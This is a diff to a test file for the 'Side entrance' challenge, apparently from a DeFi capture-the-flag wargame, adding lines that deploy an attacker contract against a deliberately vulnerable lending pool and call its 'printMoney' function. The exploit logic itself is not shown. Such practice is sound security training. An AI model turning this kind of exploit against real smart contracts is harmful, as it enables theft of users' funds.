@@ -25,6 +25,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SideEntraceAttackFactory = await ethers.getContractFactory('SideEntraceAttack', attacker);
+        console.log("Starting exploit")
+        const exploit = await SideEntraceAttackFactory.deploy(this.pool.address, this.token.address, attacker.address)
+        await exploit.printMoney()
+    
+    
     });
 
     after(async function () {
